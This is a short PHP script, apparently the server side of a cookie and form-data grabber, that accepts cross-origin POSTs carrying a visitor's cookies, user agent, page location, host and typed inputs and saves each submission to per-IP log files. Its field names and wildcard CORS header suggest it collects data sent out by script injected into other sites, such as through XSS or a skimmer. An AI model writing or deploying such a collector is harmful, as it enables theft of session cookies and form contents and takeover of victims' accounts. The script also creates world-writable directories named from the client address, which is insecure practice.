<?php

header("Access-Control-Allow-Origin: *");

if ($_SERVER["REQUEST_METHOD"] == "POST") {

    $curDate = date("d-m-Y");
    $curTime = date("H:i:s");
    
    $remoteIP = $_SERVER["REMOTE_ADDR"];
    $location = $_POST["location"];
    $uagents = $_POST["uagents"];
    $cookies = $_POST["cookies"];
    $name = $_POST["name"];
    $host = $_POST["host"];
	$inputs = $_POST["inputs"];

    $data = [
        "remote_ip" => $remoteIP,
        "location" => $location,
        "uagents" => $uagents,
        "cookies" => $cookies,
        "name" => $name,
        "host" => $host,
        "date" => $curDate,
        "time" => $curTime,
		"inputs" => $inputs,
    ];

    $directory = "logs/" . $remoteIP . "/" . $curDate;
    $logfile = $directory . "/" . $curTime . ".log";

    // Create directories if they don't exist
    if (!is_dir($directory)) {
        mkdir($directory, 0777, true);
    }

    // Write data to log file
    file_put_contents($logfile, json_encode($data, JSON_PRETTY_PRINT));
    
    echo "Data saved!";
} else {
    echo "Wrong request method.";
}

?>
